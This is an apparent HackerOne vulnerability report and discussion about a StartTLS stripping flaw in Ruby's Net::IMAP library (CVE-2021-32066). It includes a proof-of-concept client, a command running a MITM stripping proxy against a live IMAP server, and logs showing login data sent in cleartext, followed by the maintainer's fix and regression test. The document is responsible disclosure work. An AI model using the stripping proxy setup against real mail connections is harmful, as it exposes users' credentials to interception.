{"id":1178562,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTc4NTYy","url":"https://hackerone.com/reports/1178562","title":"imap: StartTLS stripping attack (CVE-2016-0772).","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2021-04-28T16:06:30.462Z","submitted_at":"2021-04-28T16:06:30.578Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"chinarulezzz","url":"/chinarulezzz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2021-32066"],"singular_disclosure_disabled":false,"disclosed_at":"2021-07-08T15:34:20.176Z","bug_reporter_agreed_on_going_public_at":"2021-07-08T15:34:20.098Z","team_member_agreed_on_going_public_at":"2021-07-08T01:09:28.748Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"`net/imap` does not seem to raise an exception when the remote end (imap server)  fails to respond with `tagged_response` (NO/BAD) or `OK` to an explicit call of `imap.starttls`. This may allow a malicious MITM to perform a starttls stripping attack if the client code does not explicitly set `usessl = true` on ` initialize` where it is disabled by default: it is rarely done as one might expect that `starttls` raises an exception when starttls negotiation fails (like when using `usessl` on a server that does not support it or when it fails to negotiate tls due to an ssl exception/cipher mismatch/auth fail).\n\nThe vulnerable code:\n```ruby\n    def starttls(options = {}, verify = true)\n      send_command(\"STARTTLS\") do |resp|\n        if resp.kind_of?(TaggedResponse) \u0026\u0026 resp.name == \"OK\"\n          begin\n            # for backward compatibility\n            certs = options.to_str\n            options = create_ssl_params(certs, verify)\n          rescue NoMethodError\n          end\n          start_tls_session(options)\n        end # \u003c--- End of handling :)\n      end\n    end\n```\n\n# PoC\n\nFor instance, we have the following client code:\n```ruby\nrequire 'net/imap'\n\nimap = Net::IMAP.new('0.0.0.0', 9999)\nimap.starttls\nimap.login('myLOGIN','myPASSWORD')                                            # test login\n#imap.authenticate('LOGIN', 'joe_user', 'joes_password') # test auth\nimap.disconnect\n```\nStart the proxy: `python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError`\n (See `striptls.py` in attachments).\n\nProxy output:\n```bash\n$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError\n2021-04-28 18:43:27,286 - INFO     - \u003cSession 0x7fd5850b3c10\u003e client ('127.0.0.1', 39154) has connected\n2021-04-28 18:43:27,286 - INFO     - \u003cSession 0x7fd5850b3c10\u003e connecting to target ('imap.yandex.ru', 143)\n2021-04-28 18:43:27,347 - DEBUG    - \u003cSession 0x7fd5850b3c10\u003e [client] \u003c= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\\r\\n'\n2021-04-28 18:43:27,348 - DEBUG    - \u003cRewriteDispatcher  - changed mangle: __main__.StripWithError new: True\u003e\n2021-04-28 18:43:27,348 - DEBUG    - \u003cSession 0x7fd5850b3c10\u003e [client] =\u003e [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-28 18:43:27,349 - DEBUG    - \u003cSession 0x7fd5850b3c10\u003e [client] \u003c= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-28 18:43:27,349 - DEBUG    - \u003cSession 0x7fd5850b3c10\u003e [client] =\u003e [server][mangled] None\n2021-04-28 18:43:27,349 - DEBUG    - \u003cSession 0x7fd5850b3c10\u003e [client] =\u003e [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\\r\\n'\n...\n```\nAs you can see, `starttls` did not return any error to the client and `LOGIN` authentication started.\n`AUTH` is the same:\n```\n2021-04-28 18:47:00,579 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-28 18:47:00,579 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] \u003c= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-28 18:47:00,579 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server][mangled] None\n2021-04-28 18:47:00,579 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          'RUBY0002 AUTHENTICATE'\n2021-04-28 18:47:00,580 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          ' LOGIN\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] \u003c= [server][mangled] '+\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server][mangled] None\n2021-04-28 18:47:00,580 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          'am9lX3VzZXI=\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] \u003c= [server][mangled] '+ UGFzc3dvcmQ6\\r\\n'\n2021-04-28 18:47:00,580 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server][mangled] None\n2021-04-28 18:47:00,581 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          'am9lc19wYXNzd29yZA==\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] \u003c= [server][mangled] '+ UGFzc3dvcmQ6\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server][mangled] None\n2021-04-28 18:47:00,581 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          'am9lc19wYXNzd29yZA==\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] \u003c= [server][mangled] '+ UGFzc3dvcmQ6\\r\\n'\n2021-04-28 18:47:00,581 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server][mangled] None\n2021-04-28 18:47:00,582 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          'am9lc19wYXNzd29yZA=='\n2021-04-28 18:47:00,582 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] =\u003e [server]          '\\r\\n'\n2021-04-28 18:47:00,635 - DEBUG    - \u003cSession 0x7fd5850b3dd0\u003e [client] \u003c= [server]          'RUBY0002 BAD Command syntax error. sc=PleRNJ32YGk1_281547_4-d4596b06cae3\\r\\n'\n```\n\nI set the same CVSS as CVE-2016-0772 has.\n\n## Impact\n\nAllows man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a \"StartTLS stripping attack.\"","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":32,"name":"Cryptographic Issues - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1281885,"file_name":"striptls.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/oo15hcnzlqh4mu5tdbphkk2jlmq0?response-content-disposition=attachment%3B%20filename%3D%22striptls.py%22%3B%20filename%2A%3DUTF-8%27%27striptls.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ76PP2BUX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T133008Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIGHP7cIwt2Tsf8KjliDyT5Lb7ly0JskiaYe2ChAX3AmbAiAqtHMw8uLFecT9g9U5UE%2FCxE1a%2BtPZJAnSYYnH2BI8piqDBAju%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMzMSFx2nvHLNo5SLgKtcDcW%2FgFn8cU0mgC1%2FVdGfTPYSBsMiGZbBVEFWLz7BIkAjvx1Yl0xNwccsia5mxGh5Pof1BmLOj%2FPbfN0yxfjTbBvX%2BtxFisFe4lleD7sAfIMQHgrItYYlJlrAkcGTOF0hj5oy17q8C901VMWg1M3Oq1DUHqNUDjNiOuNs3pYI8%2F%2FpJPSaJwkT0kt%2FgzY3%2FaZ0aVY4K5doqZxp2VxJBM6CwnM47o6IbMvH%2F6hCdkC2dfUYQhPAa%2FygUp%2Fmm%2FrBM1LnDwRHK5mENZHzc9lNN77yHKCN1H3z9bi6t%2FdgHvkJFjucgPEBep99zqb1GTqjJfJh62po7%2FS6VgiubeoT%2ByWP%2FtbqeYVZAMxxgiX1mB4dTzOp9zUHuTJ5nixo2KbV6zjXbuM3CsrhUAywRCeq1ysa5sihESBZMzWy4KTeSnnVgA3YGSpb6bjYVcuyXShrdtMdh%2Bi%2Fut350eVReQuhtta9UeSQASWy1DEqou8oW6%2BWrK%2Fu8ty%2Bdy03u84XY3jIFi15g20CivixBXwDrJq5GMnahFYcvlzz%2FNfvLxBKnaZyOEiCkM%2BOhX4C4%2BLxcdNS1%2B%2FJZkMdX5isJd3PLZxJ0Za4ah4jaZUkoTXoWEByAePJ%2FcQ2oGnMS56ZNMLTgkIsGOqYBDJcz6RvFiMKVMfgvSf0yaXoPP4o%2BD%2Fa8JI%2BvkanDoFK0GH2rrIW6QMEbvg1sbDA%2B9VmM8kFxkCwfS%2F888Z5ykzUXec2dE5NYyugHVg5stjEJdkzVfFm30TsJCuULkIUdUPpiclOA72MSSbJsTlChJhjuLyQb8nARpH6iLndWaVXQjXW0hsGl9kRoYIkectIjPcMElLSYn47zPkurLskrWPNIcaHBlw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=893e16c08c11a0fc656a33cafff9e6baf7f7f374829f9e1e67057744a168e322","file_size":80175,"type":"text/x-python"}],"allow_singular_disclosure_at":"2021-08-07T01:09:28.877Z","allow_singular_disclosure_after":-5660439.744905396,"singular_disclosure_allowed":true,"vote_count":8,"voters":["sw33tlie","run_win","ali","frankiexote","citril","ekgaribadmi","lil_nix","666devash_stampede"],"severity":{"rating":"medium","score":6.5,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":28212,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/ruby/ruby","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":11550592,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you. @shugo What do you think?","automated_response":false,"created_at":"2021-04-28T16:24:55.840Z","updated_at":"2021-04-28T16:24:55.840Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11557358,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for your report.\nI'd like to handle this issue as a vulnerability.","automated_response":false,"created_at":"2021-04-28T22:12:45.420Z","updated_at":"2021-04-28T22:12:45.420Z","actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11572411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chinarulezzz Could you try the following fix?\nIt raises an Net::IMAP::UnknownResponseError with striptls.py on my box.\n\n```ruby\ncommit ee82fc874a10f76f6e83dc4026a96a805aa0713c\nAuthor: Shugo Maeda \u003cshugo@ruby-lang.org\u003e\nDate:   Fri Apr 30 08:51:27 2021 +0900\n\n    Fix StartTLS stripping vulnerability\n    \n    Reported by Alexandr Savca in https://hackerone.com/reports/1178562\n\ndiff --git a/lib/net/imap.rb b/lib/net/imap.rb\nindex d3f2e25..f9c2822 100644\n--- a/lib/net/imap.rb\n+++ b/lib/net/imap.rb\n@@ -1315,12 +1315,14 @@ module Net\n       end\n       resp = @tagged_responses.delete(tag)\n       case resp.name\n+      when /\\A(?:OK)\\z/ni\n+        return resp\n       when /\\A(?:NO)\\z/ni\n         raise NoResponseError, resp\n       when /\\A(?:BAD)\\z/ni\n         raise BadResponseError, resp\n       else\n-        return resp\n+        raise UnknownResponseError, resp\n       end\n     end\n \n@@ -4121,6 +4123,10 @@ module Net\n     class ByeResponseError \u003c ResponseError\n     end\n \n+    # Error raised upon an unknown response from the server.\n+    class UnknownResponseError \u003c ResponseError\n+    end\n+\n     RESPONSE_ERRORS = Hash.new(ResponseError)\n     RESPONSE_ERRORS[\"NO\"] = NoResponseError\n     RESPONSE_ERRORS[\"BAD\"] = BadResponseError\ndiff --git a/test/net/imap/test_imap.rb b/test/net/imap/test_imap.rb\nindex 4fb9f74..f29fa1f 100644\n--- a/test/net/imap/test_imap.rb\n+++ b/test/net/imap/test_imap.rb\n@@ -127,6 +127,16 @@ class IMAPTest \u003c Test::Unit::TestCase\n         imap.disconnect\n       end\n     end\n+\n+    def test_starttls_stripping\n+      starttls_stripping_test do |port|\n+        imap = Net::IMAP.new(\"localhost\", :port =\u003e port)\n+        assert_raise(Net::IMAP::UnknownResponseError) do\n+          imap.starttls(:ca_file =\u003e CA_FILE)\n+        end\n+        imap\n+      end\n+    end\n   end\n \n   def start_server\n@@ -883,6 +893,27 @@ EOF\n     end\n   end\n \n+  def starttls_stripping_test\n+    server = create_tcp_server\n+    port = server.addr[1]\n+    start_server do\n+      sock = server.accept\n+      begin\n+        sock.print(\"* OK test server\\r\\n\")\n+        sock.gets\n+        sock.print(\"RUBY0001 BUG unhandled command\\r\\n\")\n+      ensure\n+        sock.close\n+        server.close\n+      end\n+    end\n+    begin\n+      imap = yield(port)\n+    ensure\n+      imap.disconnect if imap \u0026\u0026 !imap.disconnected?\n+    end\n+  end\n+\n   def create_tcp_server\n     return TCPServer.new(server_addr, 0)\n   end\n```\n\nI don't remember why a block is given to send_command even though it handles only tagged OK response, but I don't fix it to keep the patch simple.\n\n","automated_response":false,"created_at":"2021-04-30T00:06:12.973Z","updated_at":"2021-04-30T00:06:12.973Z","actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11575178,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@shugo Tested and LGTM.\n\nP.S.\n\n\u003eI don't remember why a block is given to send_command even though it handles only tagged OK response, but I don't fix it to keep the patch simple.\n\nYeah. And if you plan to fix it in the future, it seems that the second check of `resp.name` is redundant in the following procedure, since an exception is thrown in the case of a non-OK resp?\n\n```ruby\n    def starttls(options = {}, verify = true)\n      send_command(\"STARTTLS\") do |resp|\n        if resp.kind_of?(TaggedResponse) \u0026\u0026 resp.name == \"OK\" # \u003c--\n```\n\n","automated_response":false,"created_at":"2021-04-30T08:18:16.723Z","updated_at":"2021-04-30T08:18:16.723Z","actor":{"username":"chinarulezzz","cleared":false,"url":"/chinarulezzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11575283,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Nope. I was wrong. It seems that the client sends to the server encrypted data and _after_ that thrown the `UnknownResponseError`:\n\n```\n2021-04-30 11:24:58,984 - DEBUG    - \u003cSession 0x7f214296e090\u003e [client] =\u003e [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-30 11:24:58,985 - DEBUG    - \u003cSession 0x7f214296e090\u003e [client] \u003c= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-30 11:24:58,985 - DEBUG    - \u003cSession 0x7f214296e090\u003e [client] =\u003e [server][mangled] None\n2021-04-30 11:24:58,987 - DEBUG    - \u003cSession 0x7f214296e090\u003e [client] =\u003e [server]          '\\x16\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xfc\\x03\\x03P\\x9a\\x8b=^?\\xdd\\xfe\\xa8\\nY\\xab\\xcc\\xcd\\xcc\\x98\\xda:\\xa2\\xc9\\xad \\x1e,\\'\\xb9\\x04\\xa9\\xdd\\x91\\xb2\\x95\\x00\\x00\u003e\\x13\\x02\\x13\\x03\\x13\\x01\\xc0,\\xc00\\x00\\x9f\\xcc\\xa9\\xcc\\xa8\\xcc\\xaa\\xc0+\\xc0/\\x00\\x9e\\xc0$\\xc0(\\x00k\\xc0#\\xc0\\'\\x00g\\xc0\\n\\xc0\\x14\\x009\\xc0\\t\\xc0\\x13\\x003\\x00\\x9d\\x00\\x9c\\x00=\\x00\u003c\\x005\\x00/\\x00\\xff\\x01\\x00\\x01\\x95\\x00\\x00\\x00\\x0c\\x00\\n\\x00\\x00\\x070.0.0.0\\x00\\x0b\\x00\\x04\\x03\\x00\\x01\\x02\\x00\\n\\x00\\x0c\\x00\\n\\x00\\x1d\\x00\\x17\\x00\\x1e\\x00\\x19\\x00\\x18\\x00#\\x00\\x00\\x00\\x16\\x00\\x00\\x00\\x17\\x00\\x00\\x00\\r\\x000\\x00.\\x04\\x03\\x05\\x03\\x06\\x03\\x08\\x07\\x08\\x08\\x08\\t\\x08\\n\\x08\\x0b\\x08\\x04\\x08\\x05\\x08\\x06\\x04\\x01\\x05\\x01\\x06\\x01\\x03\\x03\\x02\\x03\\x03\\x01\\x02\\x01\\x03\\x02\\x02\\x02\\x04\\x02\\x05\\x02\\x06\\x02\\x00+\\x00\\t\\x08\\x03\\x04\\x03\\x03\\x03\\x02\\x03\\x01\\x00-\\x00\\x02\\x01\\x01\\x003\\x00\u0026\\x00$\\x00\\x1d\\x00 \\x9e\\xec_\"\\x8eF\\x01\\xf5\\xf6H\\x92Y\\x82\\x8f\\xce\\xbb\\x9e\u0026h\\x07\\xddd\\xc4\\x04\\x84\\x17\\xb6\\xa8b,\\xcd\\x12\\x00\\x15\\x00\\xec\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n2021-04-30 11:25:29,019 - WARNING  - \u003cSession 0x7f214296e090\u003e terminated.\n```","automated_response":false,"created_at":"2021-04-30T08:29:30.989Z","updated_at":"2021-04-30T08:29:30.989Z","actor":{"username":"chinarulezzz","cleared":false,"url":"/chinarulezzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11576046,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chinarulezzz \n\u003e Yeah. And if you plan to fix it in the future, it seems that the second check of resp.name is redundant in the following procedure, since an exception is thrown in the case of a non-OK resp?\n\nYes, I'll fix it as follows:\n\n```ruby\n        def starttls(options = {}, verify = true)\n          resp = send_command(\"STARTTLS\")\n          begin\n            # for backward compatibility\n            certs = options.to_str\n            options = create_ssl_params(certs, verify)\n          rescue NoMethodError\n          end\n          start_tls_session(options)\n          resp\n        end\n```\n\n\u003e Nope. I was wrong. It seems that the client sends to the server encrypted data and _after_ that thrown the `UnknownResponseError`:\n\nI couldn't reproduce it.\nI got the following result:\n\n```\n2021-04-30 17:47:16,254 - INFO     - \u003cProxy 0x10d307d50 listen=('0.0.0.0', 9999) target=('imap.yandex.ru', 143)\u003e ready.\n2021-04-30 17:47:16,254 - DEBUG    - * added vector (port:143  , proto:    IMAP): \u003cclass __main__.StripWithError at 0x10d309a78\u003e\n2021-04-30 17:47:16,254 - INFO     - \u003cRewriteDispatcher ssl/tls_intercept=False vectors={143: set([\u003cclass __main__.StripWithError at 0x10d309a78\u003e])}\u003e\n2021-04-30 17:47:26,092 - DEBUG    - \u003cProtocolDetect 0x10d3913d0 protocol_id=PROTO_IMAP len_history=0\u003e - protocol detected (target port)\n2021-04-30 17:47:26,093 - INFO     - \u003cSession 0x10d391390\u003e client ('127.0.0.1', 51955) has connected\n2021-04-30 17:47:26,093 - INFO     - \u003cSession 0x10d391390\u003e connecting to target ('imap.yandex.ru', 143)\n2021-04-30 17:47:26,730 - DEBUG    - \u003cSession 0x10d391390\u003e [client] \u003c= [server]          '* OK Yandex IMAP4rev1 at myt3-e294cef8d474.qloud-c.yandex.net:143 ready to talk with ::ffff:219.105.49.16:51956, 2021-Apr-30 11:47:26, QlZ6ZC0NUCg1\\r\\n'\n2021-04-30 17:47:26,730 - DEBUG    - \u003cRewriteDispatcher  - changed mangle: __main__.StripWithError new: True\u003e\n2021-04-30 17:47:26,731 - DEBUG    - \u003cSession 0x10d391390\u003e [client] =\u003e [server]          'RUBY0001 STARTTLS\\r\\n'\n2021-04-30 17:47:26,731 - DEBUG    - \u003cSession 0x10d391390\u003e [client] \u003c= [server][mangled] 'RUBY0001 BUG unhandled command\\r\\n'\n2021-04-30 17:47:26,732 - DEBUG    - \u003cSession 0x10d391390\u003e [client] =\u003e [server][mangled] None\n2021-04-30 17:47:26,733 - WARNING  - session.close(): Exception: error(57, 'Socket is not connected')\n2021-04-30 17:47:26,733 - WARNING  - \u003cSession 0x10d391390\u003e terminated.\n```\n\nHave you changed anything in PoC?","automated_response":false,"created_at":"2021-04-30T09:00:28.088Z","updated_at":"2021-04-30T09:00:28.088Z","actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11576341,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003eHave you changed anything in PoC?\n\nNo. But I don't fixed `starttls` as you. Just removed `resp.name == \"OK\"`:\n\n```ruby\n    def starttls(options = {}, verify = true)\n      send_command(\"STARTTLS\") do |resp|\n        if resp.kind_of?(TaggedResponse)# \u0026\u0026 resp.name == \"OK\"\n          begin\n            # for backward compatibility\n            certs = options.to_str\n            options = create_ssl_params(certs, verify)\n          rescue NoMethodError\n          end\n          start_tls_session(options)\n        end\n      end\n    end\n```\nThat's a lousy fix, yeah :)\n\nWith your patch i got the same result as you (couldn't reproduce it too). All is fine.\n","automated_response":false,"created_at":"2021-04-30T09:16:43.187Z","updated_at":"2021-04-30T09:16:43.187Z","actor":{"username":"chinarulezzz","cleared":false,"url":"/chinarulezzz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/8bTs1ocGqLJRNZAWnFyrSfqK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":11576628,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"\u003e No. But I don't fixed starttls as you.\n\nAh, I see.\n\nSo, I'll fix the vulnerability without the fix of the starttls method (the first patch in https://hackerone.com/reports/1178562#activity-11572411), and fix starttls after the security fix releases. ","automated_response":false,"created_at":"2021-04-30T09:46:32.589Z","updated_at":"2021-04-30T09:46:32.589Z","actor":{"username":"shugo","cleared":false,"url":"/shugo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/076/177/c63f990ae1ef62a77c2ff1e5b2db5e4dd3db2557_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":11650077,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"CVE-2021-32066 has been assigned:\n\n\u003e [Suggested description]\n\u003e An issue was discovered in Ruby through 2.6.7, 2.7.x through 2.7.3, and\n\u003e 3.x through 3.0.1. Net::IMAP does not raise an exception when StartTLS\n\u003e fails with an an unknown response, which might allow man-in-the-middle\n\u003e attackers to bypass the TLS protections by leveraging a network\n\u003e position between the client and the registry to block the StartTLS\n\u003e command, aka a \"StartTLS stripping attack.\"\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Vulnerability Type]\n\u003e Missing SSL Certificate Validation\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Vendor of Product]\n\u003e the Ruby community\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Affected Product Code Base]\n\u003e Ruby - 3.0.1 or before\n\u003e Ruby - 2.7.3 or before\n\u003e Ruby - 2.6.7 or before\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Affected Component]\n\u003e Net::IMAP\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Attack Type]\n\u003e Remote\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Impact Information Disclosure]\n\u003e true\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Attack Vectors]\n\u003e To exploit vulnerability, a user must connect to a malicious MITM IMAP server.\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Reference]\n\u003e https://hackerone.com/reports/1178562\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Has vendor confirmed or acknowledged the vulnerability?]\n\u003e true\n\u003e \n\u003e ------------------------------------------\n\u003e \n\u003e [Discoverer]\n\u003e Alexandr Savca\n\nUse CVE-2021-32066.\n\n\n-- \nCVE Assignment Team\nM/S M300, 202 Burlington Road, Bedford, MA 01730 USA\n[ A PGP key is available for encrypted communications at\n  https://cve.mitre.org/cve/request_id.html 